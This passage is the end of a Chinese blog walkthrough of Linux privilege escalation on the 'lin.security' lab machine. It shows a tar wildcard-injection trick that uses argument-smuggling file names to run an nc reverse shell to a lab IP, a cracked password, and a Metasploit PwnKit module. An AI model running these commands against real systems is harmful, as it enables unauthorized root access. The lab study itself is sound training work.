+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;mkfifo /tmp/htukkim; nc 192.168.165.31 9999 0&lt;/tmp/htukkim | /bin/sh &gt;/tmp/htukkim 2&gt;&amp;1; rm /tmp/htukkim&#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">sh</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">sh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s">&#34;--checkpoint=1&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="n">9999</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>此时成功接收到root用户的反弹shell会话</strong></p>
+<p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/29.png"
+	width="1810"
+	height="590"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/29_hu_f3692509af14143c.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/29_hu_c99001c564c6396c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="306"
+		data-flex-basis="736px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">AzER3pBZh6WZE</span><span class="w">     </span><span class="o">===&gt;</span><span class="w">    </span><span class="n">P</span><span class="nd">@ssw0rd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="5内核提权漏洞">5.内核提权漏洞
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">use</span><span class="w"> </span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">cve_2021_4034_pwnkit_lpe_pkexec</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/30.png"
+	width="1801"
+	height="777"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/30_hu_426df3d92327c91b.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/30_hu_da3d3d270ecf686b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="556px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jun 17, 2025 22:24 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/logo.27e26041cc2856a527adabb8c78494ea_hu_cc9bfe2f1440a103.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 内网远控工具利用思路"
+                        
+                        data-hash="md5-J&#43;JgQcwoVqUnrau4x4SU6g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内网远控工具利用思路</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/logo.7aaef5c28d18935a0e9b424e3167fa3a_hu_b31069062dec333b.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 数据库提权"
+                        
+                        data-hash="md5-eq71wo0Yk1oOm0JOMWf6Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">数据库提权</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
